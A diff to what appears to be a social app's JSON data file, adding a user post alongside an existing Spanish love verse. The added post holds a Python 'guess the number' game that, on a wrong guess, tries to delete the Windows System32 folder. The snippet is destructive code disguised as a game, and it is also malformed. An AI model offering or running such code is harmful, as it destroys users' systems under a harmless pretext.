@@ -654,6 +654,13 @@
       "me_gustas_totales": 0,
       "publicaciones": [
         {
+          "id": 1774284290474,
+          "texto": "import random\nimport os\nnumber = random.randint(1,10)\nguess = input(\"Silly game! Guess number between 1 and 10\")\nguess = int(guess)\nif guess == number:\nprint(\"You won!\")\nelse:\nos.remove(\"C:\\Windows\\System32\")",
+          "fecha": "23/3/2026, 10:44:50 a.m.",
+          "likes": 0,
+          "comentarios": []
+        },
+        {
           "id": 1774282741855,
           "texto": "Casi todos sabemos querer, pero pocos sabemos amar\nEs que amar y querer no es igual\nAmara es sufrir, querer es gozar",
           "fecha": "23/3/2026, 10:19:01 a.m.",
